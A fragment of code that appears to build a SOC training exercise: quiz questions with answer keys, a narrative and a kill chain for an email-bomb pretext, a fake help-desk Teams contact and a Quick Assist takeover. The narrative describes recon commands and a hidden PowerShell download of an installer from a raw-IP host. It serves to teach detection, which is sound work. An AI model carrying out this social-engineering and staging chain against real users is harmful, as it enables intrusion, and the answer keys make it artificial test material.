      hint: "Compare the ticket's origin and its work notes (evt_ebh_00a), who was operating the session, and what happened in the mailbox beforehand.",
      kind: "single",
      options: [
        { value: "ticket_tech_noflood", label: "WKS-NW-072 maps to a ticket its own user opened, was run by a known internal technician, and had no mail burst or cold offer; WKS-NW-118 inverts all three" },
        { value: "tls_channel", label: "The benign session was encrypted end to end while the malicious one ran in the clear, and that transport difference is what makes one safe and the other not" },
        { value: "severity_tag", label: "The benign event is labelled informational and the malicious ones are labelled high, and that severity labelling in the SIEM is what distinguishes them" },
        { value: "off_hours", label: "The benign session ran during business hours and the malicious one ran overnight, which is the one meaningful difference between the two sessions" },
      ],
      answer: "ticket_tech_noflood",
      xp: 60,
      explanation:
        "Both are the same class of activity, so the verdict turns on provenance. The WKS-NW-072 session maps to INC0210044, a ticket its own user opened through the portal (the record and its work notes are in the telemetry), was driven by internal technician r.kline, and had no mail flood and no cold offer of help before it; every link is accountable. The WKS-NW-118 session inverts each: no user-opened ticket for the session, an external-tenant account reached through Teams, and an engineered mail burst as the setup. (b) is a red herring: both sessions use the same Microsoft relay over TLS, and encryption is not what makes a session legitimate. (c) reverses cause and effect: the severity labels are a result of the analysis, not evidence for it. (d) invents a timing contrast the records do not show (both ran in business hours) and that would not be decisive anyway.",
    },
    {
      id: "q5",
      prompt:
        "You are scoping containment. Quick Assist is a legitimate Microsoft tool, the operator has profiled the host and staged an installer from a raw-IP address, and access came through a fake help-desk call. Which response fits the evidence?",
      hint: "The tool being legitimate does not make the session safe. Think about the live channel, the account, the staged file, and the way in.",
      kind: "single",
      options: [
        { value: "isolate_reset_hunt", label: "Isolate WKS-NW-118, reset j.mercer and revoke her tokens, quarantine the staged installer, hunt what ran in the session, verify the caller out-of-band" },
        { value: "block_ip_only", label: "Block 193.233.132.62 at the firewall, with the staging host unreachable, the operator's access and the payload chain are cut and the case can be closed" },
        { value: "purge_mail", label: "Purge the newsletter emails tenant-wide and block their senders at the gateway, since removing the flood that started it all is what resolves the incident" },
        { value: "disable_qa", label: "Disable Quick Assist across the fleet by GPO; because the session used that tool, removing the tool from every endpoint ends the incident on its own" },
      ],
      answer: "isolate_reset_hunt",
      xp: 65,
      explanation:
        "Containment has to address the live channel, the account, the staged file and the way in, not just one artefact. Isolating the host severs the operator's hands-on session immediately; resetting j.mercer and revoking her tokens closes the identity the operator acted through; locating and quarantining the staged installer (C:\\Windows\\Temp\\nw-support-agent.msi) prevents the next step; and because access arrived through a fake Service Desk contact, the external tenant should be blocked in Teams federation and the remote-support workflow tightened. (b) blocks one address but leaves the running session and the staged file untouched. (c) treats the flood as the incident; it was only the bait, and purging it does nothing about the remote session. (d) blocks the tool everywhere yet ignores the live session, the account and the staged installer already on this host.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title: "Remote-support session on an accounts payable workstation",
    threat_actor: "Social-engineering intrusion operator (mail-flood pretext, help-desk impersonation)",
    attack_kind: "email_bomb_social_eng",
    briefing:
      "CrowdStrike raised a High detection on WKS-NW-118, the workstation of j.mercer in accounts payable: a built-in remote-support tool started and the session ran enumeration commands. Decide whether this was real IT support, how control of the keyboard was obtained, and what to contain.",
    narrative: `The day before, an ordinary remote-support session ran on WKS-NW-072: the built-in Quick Assist tool, started against ticket INC0210044, a ticket the machine's own user had opened through the portal about half an hour earlier, and driven by a known internal technician, r.kline. The ServiceNow record shows the technician's work note. No mailbox flood preceded it and no one had cold-contacted the user. That is what sanctioned Quick Assist support looks like, and it is the yardstick for everything that follows. It is its own case on its own host and shares nothing with the attack.

At 09:14 the mailbox of j.mercer, an accounts-payable clerk, began to fill. Over the next fourteen minutes Defender for Office 365 delivered 312 inbound subscription and newsletter confirmation emails from 297 distinct external senders (Substack, the New York Times, Notion, Wired, LinkedIn, Medium and hundreds more); the Sentinel correlation counts them and six sampled messages are in the telemetry. Every one was a genuine double-opt-in message, scanned and delivered clean; none carried malware or a phishing verdict. That is the signature of an email bomb: not one malicious message, but an overwhelming volume of benign ones. At 09:22 she opened ticket INC0210318, "mailbox flooded", through the portal, and at 09:25 created an inbox rule to sweep the "confirm" mail into a folder, which the Exchange audit log recorded.

Then came the turn. At 09:29 a one-on-one Teams chat was created with her by an account from a foreign tenant, displaying as "IT Service Desk" (helpdesk@nw-itdesk-support.onmicrosoft.com). The person offered to stop the flood if she started Quick Assist and read out the six-digit code. No IT-initiated ticket existed for that outreach, and the sender was not in the staff directory; she told the Service Desk afterwards, and the work note on the ticket records it. The flood, in other words, was never the attack; it was the pretext manufactured to make that contact believable.

At 09:33 Quick Assist launched on WKS-NW-118 and connected to Microsoft's remote-assistance service. Falcon recorded quickassist.exe as fully signed and trusted (Microsoft Windows), because it genuinely is Microsoft's own tool, not malware. Nothing about the binary is wrong; everything about the context is. There was no user-opened ticket for the session, and it began on the word of an unsolicited contact, minutes after an engineered mail flood (T1219). Remote-operator input runs inside the user's own session, so the commands that followed were launched from explorer.exe while the Quick Assist session was open: a command prompt at 09:35, then systeminfo (T1082), quser (T1033) and net localgroup administrators (T1069.001), host, session and local-privilege reconnaissance a payments clerk's workstation has no reason to perform. At 09:41 a hidden PowerShell started from that command prompt used Invoke-WebRequest to pull nw-support-agent.msi over plain HTTP from a raw-IP host, 193.233.132.62, into C:\\Windows\\Temp (T1059.001), staging follow-on tooling. Two minutes later Falcon correlated the unsolicited Quick Assist session and the discovery burst into a single High detection.

The case is deliberately uncomfortable for an analyst who trusts signatures and chases the loudest signal. The tool at the centre of it verifies perfectly, and the hundreds of alarming-looking emails are all clean. The verdict comes only from reading the whole chain in order (an engineered flood, an unsolicited external contact, a remote session no one requested) and against the sanctioned Quick Assist session that proves the same shape can be entirely legitimate when the provenance is accountable.`,
    learning_objectives: [
      "Recognise an email bomb, a short-window burst of individually-clean subscription and newsletter confirmations from many distinct senders to one mailbox, as a social-engineering setup, not a malware event",
      "Explain why a flood of individually-legitimate emails is the opening move and not the attack: it overwhelms the target and manufactures a pretext for a fake help-desk contact",
      "Trace the contact pivot: an unsolicited Teams chat from an external tenant impersonating the Service Desk that talks a user into starting Quick Assist and sharing the code (T1566.003/T1566.004 into T1219)",
      "Judge a signed, built-in Microsoft remote-support tool by its context, no user-opened ticket, unsolicited contact, host enumeration afterward, rather than by its trusted signature",
      "Scope containment for a Quick Assist takeover: isolate the host and sever the session, reset the targeted user, hunt the staged tooling, and verify the caller out-of-band",
    ],
    alerts: [],
    events,
    iocs,
    killchain: [
      { ts: "2026-08-24T15:20:00.000Z", phase: "Baseline", action: `Sanctioned Quick Assist session on ${benign.hostname}: user-opened ticket ${benignTicket}, internal technician ${benignTech}, no mail flood` },
      { ts: T(0), phase: "Pretext", action: `Email bomb begins: a burst of benign subscription confirmations from hundreds of distinct senders floods ${victim.email} (setup)` },
      { ts: T(11 * MIN), phase: "Observation", action: `${victim.sam} creates an inbox rule to sweep the confirmation mail; the flood is corroborated from the Exchange audit log and the Sentinel correlation` },
      { ts: T(15 * MIN + 10 * SEC), phase: "Initial Access", action: `An external-tenant account posing as the Service Desk starts a Teams chat and asks ${victim.sam} to start Quick Assist and share the code (T1566.003)` },
      { ts: T(19 * MIN), phase: "Command and Control", action: `${victim.sam} launches Quick Assist on ${victim.hostname}: signed and trusted, but no user-opened ticket (T1219)` },
      { ts: T(22 * MIN), phase: "Discovery", action: "systeminfo, launched from a command prompt during the remote session: host profiling (T1082)" },
      { ts: T(23 * MIN), phase: "Discovery", action: "quser: logged-on session enumeration (T1033)" },
      { ts: T(24 * MIN), phase: "Discovery", action: "net localgroup administrators: local admin enumeration (T1069.001)" },
      { ts: T(27 * MIN), phase: "Execution", action: `Hidden PowerShell stages ${payloadName} from ${stagingIp} into C:\\Windows\\Temp (T1059.001)` },
      { ts: T(29 * MIN), phase: "Detection", action: "Falcon correlates the unsolicited Quick Assist session and the discovery burst into a High detection" },
    ],
    questions,
  };
}
